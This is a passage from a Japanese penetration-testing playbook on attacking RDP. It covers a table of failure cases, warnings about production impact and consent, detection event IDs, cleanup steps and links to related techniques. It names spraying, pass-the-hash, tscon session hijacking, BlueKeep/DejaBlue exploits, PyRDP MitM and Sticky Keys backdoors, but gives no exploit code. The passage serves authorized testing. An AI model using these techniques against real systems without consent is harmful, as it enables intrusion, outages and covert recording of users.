**注意:** PyRDP は研究・トレーニング用途で公開されているが、**実環境への適用は法的・倫理的に grey** で、特に被害者の合意なき録画は GDPR / 各国プライバシー法に抵触する可能性がある。対象組織との合意で MitM の範囲・記録媒体・保管期間を明示すること。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `nmap` で 3389 open だが `rdp-enum-encryption` が無応答 | 非標準 RDP 実装 / 中間 FW | `rdp-ntlm-info` 単独で再試行・`xfreerdp` の挙動で代替判定 |
| 認証スプレーで全 cred が `STATUS_LOGON_TYPE_NOT_GRANTED` | RDP ログオン権限（Remote Desktop Users）なし | 別プロトコル（WinRM / SMB / Impacket_Exec / WMI）へ |
| Restricted Admin PTH が `Account Restrictions ...` で失敗 | `DisableRestrictedAdmin` が `0` でない | 別 cred / 別プロトコル / 侵入後にレジストリ変更（事前合意必須） |
| NLA 有効環境で外部からの探索が極端に制限 | 認証なし情報取得手段が `rdp-ntlm-info` のみに限定 | 同手段で得た情報 + 他経路（LDAP / DNS / SMB）で AD 列挙へ |
| BlueKeep スキャナで `not exploitable` | パッチ済み or NLA で防御 | finding 化せず・別 CVE 候補へ |
| §8 セッションハイジャック後すぐ切断 | 対象ユーザーが手動再接続 | 即実行・Active セッションには実施しない |
| PyRDP MitM が CredSSP で接続不成立 | NLA 強制 | downgrade 不可・他経路へ |

## 注意点・落とし穴

> **[HIGH IMPACT]** §6 認証スプレー・§7 Restricted Admin PTH・§8 セッションハイジャック・§9 BlueKeep / §10 DejaBlue 実 exploit・§11 PyRDP MitM は本番では原則禁止または個別合意必須（詳細は各 §N 内の警告ブロック）。
>
> 特に **§9 / §10 の実 exploit は失敗時 BSOD（業務停止）が確実**。バージョン判定（`rdp-ntlm-info` / Metasploit `check`）に限り技術的判断で実施可。

> **[HIGH IMPACT]** §8 tscon ハイジャックは **原状回復不可**。奪取したセッションは強制切断され、対象ユーザーの作業内容も影響を受ける。事前合意で対象セッション・実施時刻を明示記録すること。

> **個別のブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロック横断の高影響警告のみを置く。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — §6 認証スプレー / §7 PTH Restricted Admin / §8 セッションハイジャック / §9 BlueKeep 実 exploit / §10 DejaBlue 実 exploit / §11 PyRDP MitM）/ ★★（口頭確認可 — §4 直接ログイン後の §5 リダイレクト経由ファイル exfil は対象データ機微性で判定）/ ★（§1〜§3 のバナー・NLA・証明書列挙は技術的判断のみで実施可だが、対象組織との合意範囲は確認）
- **想定される SIEM / EDR 検知**: Event 4624 / 4625 Logon Type 10 (RemoteInteractive) の連続失敗・Event 4778 / 4779 セッション connect / disconnect・Microsoft-Windows-TerminalServices-LocalSessionManager Event 21 / 24 / 25 / 41・Event 4771 / 4776 Kerberos / NTLM 認証失敗・§5 リダイレクト経由のファイル exfil は DLP の `tsclient` シグネチャ・§8 tscon サービス経由は Event 7045
- **業務影響リスク**: §6 認証スプレーでの管理者アカウントロック・§8 セッションハイジャックでの対象ユーザー業務中断・§9 BlueKeep / §10 DejaBlue 実 exploit 時の BSOD（OS クラッシュ）・§11 PyRDP MitM 経路時の被害者操作記録（プライバシー）
- **原状回復必須項目**: ✅ §8 で `sc.exe create kedalab-[CASE_ID]-hijack` を使った場合は `sc.exe delete kedalab-[CASE_ID]-hijack` で削除 / ✅ §5 でアップロードしたテストファイルの削除 / ✅ §7 でレジストリ変更（`DisableRestrictedAdmin`）を実施した場合は元の値に戻す
- **取得情報の取扱**: スクリーンキャプチャ・録画ファイル（§11）・exfil ファイル（§5）は暗号化保管、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

> **RDP セッション内の Windows 列挙・権限昇格・横展開はこのファイルの範囲外** → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`。取得した cred を起点にした他プロトコル横展開は `Impacket_Exec.md` §8 / `WinRM.md` §7 と連携する。

## 関連技術

- 前：3389 ポートの発見 → `../01_Reconnaissance/Network_Scanning.md`
- 前：OS 判定の手掛かり → `../00_Playbook/00_OS_Identification.md`
- 前：認証情報の取得 → `Credential_Discovery.md`
- 前：NTLM ハッシュ取得（§7 PTH の前提）→ `../04_Post_Access_Windows_AD/Credential_Dumping.md`
- 前：ロックアウト設定の事前確認 → `Account_Lockout_Recon.md`
- 前：製品出荷時のデフォルト認証情報試行 → `Default_Credentials.md`
- 後：シェル取得後の Windows / AD 列挙・権限昇格・横展開 → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
- 後：cred 使い回し（§6 cred reuse）検出後の他ホスト連鎖侵入 → `Impacket_Exec.md`（§8 nxc smb --continue-on-success → wmiexec）/ `WinRM.md`（§7 Lateral Movement）
- 後：§8 tscon でハイジャックしたセッションが Domain Admin の場合 → `../04_Post_Access_Windows_AD/Credential_Dumping.md`（DCSync 等）
- 関連：他プロトコルの認証層判定 → `WinRM.md`（§2 認証方式の確認）
- 関連：TLS 証明書（§3）からの組織推定軸 → `../01_Reconnaissance/TLS_Audit.md`
- 関連：内部から RDP ポートを SSH 経由でテスター側に持ち出す（Local Port Forward to 3389） → `SSH.md`（§12 Port Forwarding / SOCKS pivot）
- 関連（範囲外・post-access 領域）: RDP 接続後 / Windows シェル取得後の以下は本ファイルではなく `../04_Post_Access_Windows_AD/Enumeration_Checklist.md` 領域 — (a) Sticky Keys (`sethc.exe` / `utilman.exe` 置換) によるログオン画面 SYSTEM シェル / persistence、(b) `fDenyTSConnections` レジストリ書換による RDP 強制有効化、(c) `Win32_TerminalServiceSetting` / WMI 経由の RDP 状態確認、(d) `Remote Desktop Users` グループへのバックドアアカウント追加
